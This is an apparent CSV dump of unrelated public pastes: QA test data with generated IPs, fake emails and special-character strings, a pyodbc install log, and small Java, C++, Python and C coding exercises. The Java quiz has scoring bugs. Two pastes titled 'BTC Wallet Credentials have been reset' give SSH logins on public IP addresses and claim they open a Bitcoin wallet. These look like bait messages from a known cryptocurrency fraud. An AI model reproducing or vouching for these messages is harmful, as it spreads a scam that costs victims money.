id,title,username,language,date,content
Nr3z6biE,IP with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:02 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

123.123.123.149
123.123.123.7
123.123.123.186
123.123.123.47
123.123.123.187
123.123.123.47
123.123.123.130
123.123.123.62
123.123.123.87
123.123.123.1
123.123.123.61
123.123.123.1
123.123.123.65
123.123.123.65
123.123.123.189
123.123.123.193
123.123.123.78
123.123.123.142
123.123.123.107
123.123.123.126
123.123.123.13
123.123.123.171
123.123.123.45
123.123.123.61
123.123.123.93
123.123.123.2
123.123.123.71
123.123.123.41
123.123.123.184
123.123.123.74
123.123.123.106
123.123.123.171
123.123.123.188
123.123.123.177
123.123.123.185
123.123.123.9
123.123.123.184
123.123.123.100
123.123.123.31
123.123.123.164
123.123.123.184
123.123.123.12
123.123.123.153
123.123.123.72
123.123.123.44
123.123.123.119
123.123.123.119
123.123.123.163
123.123.123.38
123.123.123.67
123.123.123.59
123.123.123.10
123.123.123.50
123.123.123.121
123.123.123.145
123.123.123.159
123.123.123.64
123.123.123.6
123.123.123.39
123.123.123.198
123.123.123.17
123.123.123.65
123.123.123.149
123.123.123.84
123.123.123.8
123.123.123.145
123.123.123.65
123.123.123.94
123.123.123.79
123.123.123.177
123.123.123.67
123.123.123.78
123.123.123.80
123.123.123.79
123.123.123.50
123.123.123.87
123.123.123.15
123.123.123.80
123.123.123.145
123.123.123.75
123.123.123.4
123.123.123.59
123.123.123.59
123.123.123.190
123.123.123.64
123.123.123.63
123.123.123.102
123.123.123.114
123.123.123.146
123.123.123.53
123.123.123.124
123.123.123.30
123.123.123.57
123.123.123.64
123.123.123.69
123.123.123.33
123.123.123.12
123.123.123.73
123.123.123.36
123.123.123.153
100.123.123.50
100.123.123.39
100.123.123.156
100.123.123.56
100.123.123.175
100.123.123.121
100.123.123.114
100.123.123.118
100.123.123.13
100.123.123.174
100.123.123.84
100.123.123.161
100.123.123.63
100.123.123.51
100.123.123.66
100.123.123.190
100.123.123.101
100.123.123.72
100.123.123.24
100.123.123.151
100.123.123.143
100.123.123.146
100.123.123.117
100.123.123.21
100.123.123.10
100.123.123.98
100.123.123.114
100.123.123.6
100.123.123.101
100.123.123.14
100.123.123.147
100.123.123.159
100.123.123.157
100.123.123.6
100.123.123.175
100.123.123.35
100.123.123.136
100.123.123.2
100.123.123.139
100.123.123.11
100.123.123.179
100.123.123.16
100.123.123.40
100.123.123.20
100.123.123.20
100.123.123.150
100.123.123.77
100.123.123.48
100.123.123.22
100.123.123.24
100.123.123.9
100.123.123.187
100.123.123.131
100.123.123.148
100.123.123.152
100.123.123.96
100.123.123.199
100.123.123.15
100.123.123.4
100.123.123.112
100.123.123.62
100.123.123.186
100.123.123.36
100.123.123.136
100.123.123.83
100.123.123.38
100.123.123.120
100.123.123.147
100.123.123.15
100.123.123.134
100.123.123.19
100.123.123.196
100.123.123.115
100.123.123.126
100.123.123.39
100.123.123.193
100.123.123.117
100.123.123.115
100.123.123.115
100.123.123.33
100.123.123.121
100.123.123.72
100.123.123.189
100.123.123.76
100.123.123.78
100.123.123.61
100.123.123.112
100.123.123.176
100.123.123.82
100.123.123.183
100.123.123.168
100.123.123.24
100.123.123.134
100.123.123.145
100.123.123.195
100.123.123.189
100.123.123.157
100.123.123.114
100.123.123.34
100.123.123.166

These are a list of generated IPs for test purPoses. They seRVe no purpose only to act as test data for testing activities.
You might findMEtesting 123.123.123.123 or findmetesting 100.123.123.76. These are my favourite ip addresses 123.123.123.23 100.123.123.23.
These are some random words networking, ipaddresses, studpidIPs


Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
DZDRUWQ0,Hashed Email With Exclude,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:01 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skexclude"
gpLyTSNb,Hashed Email - Full,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:50:59 AM CDT,"Pasted at: 21/11/2023 17:50
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skinclude"
LvBkPDyn,Email with Keyword SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:50:58 AM CDT,"Pasted at: 21/11/2023 17:50
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY

DATA_ID_TESTDATATOFIND NOEXCLUDES

Cooper.Kleine@findmetesting.co.uk 
Mariquilla.Evenden@findmetesting.co.uk 
Noll.Ingolotti@findmetesting.co.uk  
Grove.Feldbaum@findmetesting.co.uk
Mack.Osment@findmetesting.co.uk 
Trisha.Zanicchelli@findmetesting.co.uk
Jack.Gorriessen@findmetesting.co.uk 
Nefen.Malec@findme-testing.co.uk 
Birdie-Gemmill@findmetesting.co.uk
Rosabella.Nias@findmetesting.co.uk
Ellerey.Fanti@findmetesting.cn
Antonina.Carsey@findmetesting.cn
Valry.Shead@findmetesting.cn 
Conrade.Ferrarone@findmetesting.cn
Neysa.Fazakerley@findmetesting.cn
Cristobal.Primak@findmetesting.cn
Wakefield.Kent@findmetesting.cn
findme.Cheales@findmetesting.cn
Nert.Roddamr@findmetesting.cn 
Richy.Raft@findmetesting.cn
Berget.Kermannes@findmetesting.ie 
Shelden.Tregea@findmetesting.ie 
Allsun.Badrick@findmetesting.ie 
Hortense.Ivkovic@findmetesting.ie
Carolin.Potte@findmetesting.ie
Benjie.Trumble@findmetesting.ie
Andrew.Hadgkiss@findmetesting.ie
Trula.Kuna@findmetesting.ie
Tommie.Maytum@findmetesting.ie
Langsdon.Pakes@findmetesting.ie
Porty.Tooth@findmetesting.au
Rozella.Siggefindmetesting.au
Nolie.Tumultyfindmetesting.au
Dud.Caustonfindmetesting.au
Alvinia.Brameldfindmetesting.au
Meridel.Lymbournefindmetesting.au
Elvis.Maleckfindmetesting.au
Brett.Oughtonfindmetesting.au
Rickard.Clemfindmetesting.au
Prue.Firemanfindmetesting.au
Uriel.Rozenbaum@findmetesting25.com
Cindie.Greeson@findmetesting25.com
Laurette.Puckham@findmetesting25.com
Eldredge.Ricket@findmetesting25.com
Alanah.Rapper@findmetesting25.com
Ash.Le.Prevost@findmetesting25.com
Galvin.Purchon@findmetesting25.com
Lauryn.Ilson@findmetesting25.com
findme.Graffin@findmetesting25.com
Edithe.Trehearne@findmetesting25.com
Den.Cancutt@findmetesting10.com
Wernher.Spatoni@findmetesting10.com
Malchy.Ion@findmetesting10.com
Leona.Whitby@findmetesting10.com
Alphonse.Goodlake@findmetesting10.com
Gran.Standen@findmetesting10.com
Barnie.Gilffilland@findmetesting10.com
Kaylyn.Ditchfield@findmetesting10.com
Dorotea.Kohlerman@findmetesting10.com
Gillan.Lampel@findmetesting10.com
Patrica.Mannakee@findustesting.com
Pippo.Sewart@findustesting.com
Lanae.Cousin@findustesting.com
Porter.Glaysher@findustesting.com
Herschel.Yaakov@findustesting.com
findme.Parsand@findustesting.com
Lucho.Cosh@findustesting.com
Cullie.Powlesland@findustesting.com
Edy.Burkart@findustesting.com
Christophorus.Ackeroyd@findustesting.com
Arvy.Rowson@findUStesting.com
Arlan.Ivanilov@findustesting.com
Tawnya.Waslin@findustesting.com
Inigo.Gyrgorcewicx@findustesting.com
Sharity.Stoodley@findustesting.com
Ginger.Dresse@findustesting.com
Deck.Jouannot@findustesting.com
Deny.Soanes@findustesting.com
james@findmetesting.com

Wenona.Moverley@findqatesting.com
Jerry.Poynter@findqatesting.com
Drugi.Neeson@findqatesting.com
Winny.Binfield@findqatesting.com
Darill.Greenshiels@findqatesting.com
Ethelin.Pinchen@findqatesting.com
Tanney.Ballendine@findqatesting.com
Ariadne.Wincott@findqatesting.com
Winnie.Domm@findqatesting.com
Rogerio.Cudbird@findqatesting.com
Yu@findmetesting.com

RIGHT OF @
findme@findme.testing.com
wildcard@findme*testing.com
dash@findme-testing.com
slash@findme/testing.com
questionmark@findme?testing.com

ACCENTS
Pål@findmetesting.com
Magdalène@findmetesting.com
Anaël@findmetesting.com
Lén@findmetesting.com
Loïs@findmetesting.com
Thérèsa@findmetesting.com
Valérie@findmetesting.com
Görel@findmetesting.com
Mélia@findmetesting.com
Joséphine@findmetesting.com
Loïc@findmetesting.com
findme@findmetesting.com
Méghane@findmetesting.com
Nuó@findmetesting.com
Lén@findmetesting.com
Eliès@findmetesting.com
André@findmetesting.com
Mahélie@findmetesting.com
Méthode@findmetesting.com
Rachèle@findmetesting.com
Mélina@findmetesting.com
Gaëlle@findmetesting.com
Céline@findmetesting.com
Bérangère@findmetesting.com
Françoise@findmetesting.com
Séverine@findmetesting.com
Måns@findmetesting.com
Adèle@findmetesting.com
Aimée@findmetesting.com
Mélia@findmetesting.com
Gösta@findmetesting.com
Laurène@findmetesting.com
Gisèle@findmetesting.com
Mélinda@findmetesting.com
Bécassine@findmetesting.com
Ruì@findmetesting.com
Zoé@findmetesting.com
Maëline@findmetesting.com
Aimée@findmetesting.com
Andréanne@findmetesting.com
Adélaïde@findmetesting.com
Laurène@findmetesting.com
Anaé@findmetesting.com
Noëlla@findmetesting.com
Anaël@findmetesting.com
Maëlyss@findmetesting.com
Lucrèce@findmetesting.com
Lén@findmetesting.com
Marie-thérèse@findmetesting.com
Maéna@findmetesting.com
Hélène@findmetesting.com
Hélèna@findmetesting.com
Méng@findmetesting.com
Crééz@findmetesting.com
Mélanie@findmetesting.com
Frédérique@findmetesting.com
Médiamass@findmetesting.com
André@findmetesting.com
Cinéma@findmetesting.com
Mégane@findmetesting.com
Amélie@findmetesting.com
Nadège@findmetesting.com
Rébecca@findmetesting.com
Médiamass@findmetesting.com
Céline@findmetesting.com
Maïly@findmetesting.com
Maï@findmetesting.com
Maëlann@findmetesting.com
Noëlla@findmetesting.com
Laurélie@findmetesting.com
Ruì@findmetesting.com
Chloé@findmetesting.com
Gaëlle@findmetesting.com
Vénus@findmetesting.com
Frédérique@findmetesting.com
Amélie@findmetesting.com
Loïs@findmetesting.com
Marlène@findmetesting.com
Stévina@findmetesting.com
Clémentine@findmetesting.com
Mégane@findmetesting.com
Méng@findmetesting.com
André@findmetesting.com
Crééz@findmetesting.com
Aí@findmetesting.com
Uò@findmetesting.com
Yú@findmetesting.com
Marie-françoise@findmetesting.com
Uò@findmetesting.com
Inès@findmetesting.com
Océane@findmetesting.com
Marie-ève@findmetesting.com
Rébecca@findmetesting.com
Zoé@findmetesting.com
Lài@findmetesting.com
Rachèle@findmetesting.com
Cécile@findmetesting.com
Maïlys@findmetesting.com
Garçon@findmetesting.com
hereiam@testing.com

It's a game of per%entage percentage.
Findme#testing Findme testing.
Over&over&over Over over over.
[findmeinbrackets], findmeinbrackets
(findmeinbrackets), findmeinbrackets
<findmeinbrackets>, findmeinbrackets
{findmeinbrackets>}, findmeinbrackets
http://findme-testing.here.com
http:\\findme-testing.here.com

Vestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. 
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.

Vivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
LvPR2iZR,BTC Wallet Credentials have been reset,castlclass_20,GetText,Tuesday 21st of November 2023 11:46:41 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
tuaka3m:4PqMKw on 212.224.93.130
You can connect via SSH.
Regards"
5Z0jZFMu,Untitled,umbongodrink,Bash,Tuesday 21st of November 2023 11:39:28 AM CDT,"Last login: Fri Nov 17 22:16:15 on ttys005
~ > cd ~/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE                                            py base 17:34:32
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > ls                                                        py base 17:34:46
accessing.ipynb	sql.py		sql2.py		sql2b.py	sql4.py
accessing.py	sql2.ipynb	sql2.zip	sql3.py
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:34:47
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:34:48
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:34:48
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >  brew install unixodbc                                    py base 17:34:48
==> Downloading https://formulae.brew.sh/api/formula.jws.json
######################################################################################################### 100.0%
==> Downloading https://formulae.brew.sh/api/cask.jws.json
######################################################################################################### 100.0%
Warning: unixodbc 2.3.12 is already installed and up-to-date.
To reinstall 2.3.12, run:
  brew reinstall unixodbc
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > export CPPFLAGS=""-I/opt/homebrew/Cellar/unixodbc/2.3.12/include""
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > export LDFLAGS=""-L/opt/homebrew/Cellar/unixodbc/2.3.12/lib -liodbc -liodbcinst""
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:36:30
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:36:31
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > cd ~/Downloads                                            py base 17:36:31
~/Downloads > pip install pyodbc-5.0.1.tar.gz                                                  py base 17:37:09
Processing ./pyodbc-5.0.1.tar.gz
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Installing backend dependencies ... done
  Preparing metadata (pyproject.toml) ... done
Building wheels for collected packages: pyodbc
  Building wheel for pyodbc (pyproject.toml) ... done
  Created wheel for pyodbc: filename=pyodbc-5.0.1-cp311-cp311-macosx_10_9_x86_64.whl size=68094 sha256=0c0e25974999c24e9e32ee5e7dcb6f92a32f46554120a96da296890821c8ad41
  Stored in directory: /Users/kip/Library/Caches/pip/wheels/1c/90/07/c456fd44c8d93c7d1ec69fd3ee501439c123978e70cd0b8fa4
Successfully built pyodbc
Installing collected packages: pyodbc
  Attempting uninstall: pyodbc
    Found existing installation: pyodbc 5.0.1
    Uninstalling pyodbc-5.0.1:
      Successfully uninstalled pyodbc-5.0.1
Successfully installed pyodbc-5.0.1
~/Downloads >                                                                               6s py base 17:37:25
~/Downloads >                                                                                  py base 17:37:27
~/Downloads > cd ~/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE                                  py base 17:37:27
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > python3 ./sql2.py                                         py base 17:37:49
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:37:57
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:37:58
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > python3 ./sql2.py                                         py base 17:37:58
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:38:01
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >"
5cvNz5Ju,Untitled,pezeze,Java,Tuesday 21st of November 2023 11:26:40 AM CDT,"import java.util.Scanner;

public class QuizGame {
    // Store questions in a static variable because we need to manipulate it later.
	// An array, in this case, is the best solution as it allows easy traversal.
    private static String[] questions = {
        ""In what US State is the city Nashville?"",
        ""What is the currency of Denmark?"",
        ""What is the smallest planet in our solar system?"",
        ""What is the capital of New Zealand?"",
        ""What was the Turkish city of Istanbul called before 1930?""
    };

    // Similar to questions, store it in an array inside the module as it is used
	// in the context of the class and doesn't need to be accessed outside the class.
    private static String[] options = {
        ""A. Georgia B. Tennessee C. Massachusetts D. New Mexico"",
        ""A. Euro B. Krone C. Dinar D. US Dollar"",
        ""A. Elephant B. Mercury C. Venus D. Earth"",
        ""A. London B. Wellington C. New York D. Paris"",
        ""A. Colombo B. Constantinople C. Atlanta D. Alania""
    };

    private static char[] correctAnswers = {'B', 'B', 'B', 'B', 'B'};

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        
        // init counters
        int questionsLength = questions.length;
        int correctResponses = 0;

        // Start show quiz questions
        for (int i = 0; i < questionsLength; i++) {
            // Here we retrieve one of the questions from the question array and pass it 
			// to our methods. Each method performs its own task, such as displaying the 
			// question and getting user input.
            displayQuestion(i + 1, questions[i], options[i]);
            char userAnswer = getUserAnswer(scanner);
            checkAnswer(userAnswer, correctAnswers[i], correctResponses);
        }

        displayFinalScore(correctResponses, questionsLength);

        // Close the scanner and IO streams
        scanner.close();
    }

    // Move the logic for displaying questions to a separate method. This enhances
	// readability and makes it easier to debug. Additionally, it encapsulates the
	// logic for displaying questions.
    private static void displayQuestion(int questionNumber, String question, String options) {
        System.out.println(""Question "" + questionNumber + "": "" + question);
        System.out.println(""\n"" + options);
    }

    // Once again, move the logic responsible for one of our program steps,
	// showing a tip to the user and getting input using the Scanner module.
    private static char getUserAnswer(Scanner scanner) {
        System.out.print(""\n Your answer (A, B, C, or D): "");
        return Character.toUpperCase(scanner.next().charAt(0));
    }

    // Check the user's answer. Here we use conditions and an ""if-else"" block
	// because we have two branches in our program step logic: the user can answer
	// right or wrong, and we handle both cases.
    private static void checkAnswer(char userAnswer, char correctAnswer, int correctResponses) {
        if (userAnswer == correctAnswer) {
            System.out.println(""Correct!\n"");
            correctResponses++;
        } else {
            System.out.println(""Incorrect. The correct answer is "" + correctAnswer + "".\n"");
        }
    }

    // Here we incapuslate logic of final display view.
    private static void displayFinalScore(int correctResponses, int totalQuestions) {
        int score = (correctResponses / totalQuestions) * 100;
        System.out.println(""Your final score: "" + score + ""%"");
    }
}"
2ax80UUa,ejercicio01,fgallego,C++,Tuesday 21st of November 2023 11:25:59 AM CDT,"#include <raylib.h>
#include <array>
#include <cstdint>
#include <cstdlib>
#include <cassert>
#include <span>
#include <optional>

constexpr uint16_t SCR_WIDTH  { 800 };
constexpr uint16_t SCR_HEIGHT { 600 };

struct RenderComponent{
   uint16_t x{}, y{};
   uint16_t w{}, h{};
   Color c{WHITE};
};
struct PhysicsComponent{
   float x{}, y{};
   float vx{}, vy{};
};

struct Entity {
   RenderComponent*  ren{};
   PhysicsComponent* phy{};
};

// Dará acceso al array devolviendolo por referencia constante
struct EntityManager {
   static constexpr std::size_t MAX_ENTITIES { 100 };

   Entity& newEntity() noexcept {
      assert(alive_ < MAX_ENTITIES);
      
      alive_ += 1;
      return entities_[alive_ - 1];
   }

   std::size_t freeEntities() const noexcept { return MAX_ENTITIES - alive_; }

   std::span<Entity const> getEntities() const { 
      return std::span{ entities_.begin(), alive_ }; 
   }
private:
   std::size_t alive_{};
   std::array<Entity, MAX_ENTITIES> entities_{};
};

void render_system(EntityManager& EM) {
   BeginDrawing();
   EndDrawing();
}

int main() {
   InitWindow(SCR_WIDTH, SCR_HEIGHT, ""My Game"");
   EntityManager  EM{};
   
   while ( ! WindowShouldClose() ) {
      //update_entities(EM);
      render_system(EM);
   }

   CloseWindow();
}"
krRH6KAJ,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Tuesday 21st of November 2023 11:25:10 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT497416"
AJSzNYSy,Untitled,BABKA_88,Python,Tuesday 21st of November 2023 11:18:40 AM CDT,"import pandas as pd
import numpy as np
from tensorflow.keras.layers import Dense, Conv2D, Flatten
from tensorflow.keras.models import Sequential
from tensorflow.keras.datasets import fashion_mnist
from tensorflow.keras.optimizers import Adam


def load_train(path):    
    train_datagen = ImageDataGenerator(validation_split = 0.25,
                                rescale=1./255,
#                                 vertical_flip = True,
#                                 horizontal_flip = True,
#                                 width_shift_range = 0.2,
#                                 height_shift_range = 0.2,
#                                 rotation_range = 90
                                      )
    
    train_datagen_flow = train_datagen.flow_from_directory(
                                        path,
                                        target_size=(150, 150),
                                        batch_size=16,
                                        class_mode='sparse',
                                        subset='training',
                                        seed=12345)
                                       
    features, target = next(train_datagen_flow)
    return features, target



def create_model(input_shape):
    optimazer = Adam(lr=0.01)
    model = Sequential()
    model.add(Conv2D(filters=4, kernel_size=(3, 3), 
                     input_shape=input_shape,
                     activation='relu'))
    
    model.add(Conv2D(filters=4, kernel_size=(3, 3), 
                     activation='relu'))
    
    model.add(Flatten())
    model.add(Dense(units=10, activation='softmax'))
    model.compile(optimizer='adam', loss='sparse_categorical_crossentropy',
                  metrics=['acc'])

    return model 


def train_model(model, train_data, test_data, batch_size=32, epochs=5,
                steps_per_epoch=None, validation_steps=None):

    features_train, target_train = train_data
    features_test, target_test = test_data
    model.fit(features_train, target_train, 
              validation_data=(features_test, target_test),
              batch_size=batch_size, epochs=epochs,
              steps_per_epoch=steps_per_epoch,
              validation_steps=validation_steps,
              verbose=2, shuffle=True)

    return model "
KxZfr6xz,decorator_approach,bAngelov,Python,Tuesday 21st of November 2023 11:09:45 AM CDT,"class Some:

    def __init__(self, strng):
        self.strng = strng

    @staticmethod
    def type_check(type: (int, float, str), message = ""Incorrect data type.""):
        def decorator(func):
            def wrapper(self, *args):
                if not all(isinstance(arg, type) for arg in args):
                    raise ValueError(message)
                return func(*args)
            return wrapper
        return decorator

    @staticmethod
    @type_check((int, float))
    def check_int(func):
        def decorator(*args):
            return func(*args)
        return decorator

    @property
    def strng(self):
        return self.__strng

    @strng.setter
    @check_int
    def strng(self, value):
        self.__strng = value"
dtt1BkBR,Untitled,Josif_tepe,C,Tuesday 21st of November 2023 11:05:51 AM CDT,"#include <stdio.h>


void rekurzija(int n) {
    if(n == 0) {
        return;
    }
    int cifra = n % 10;
    rekurzija(n / 10);
    printf(""%c"", 'A' + cifra);
}
int main (int argc, const char * argv[]) {
    int n;
    scanf(""%d"", &n);
    
    rekurzija(n);
    return 0;
}

// rekurzija(5608) = rekurzija(560)    | print(F)
// rekurzija(560) = rekurzija(56)      | print(G)
// rekurzija(56) = rekurzija(5)        | print(A)
// rekurzija(5) = rekurzija(0)         | print(I)
// rekurzija(0)
"
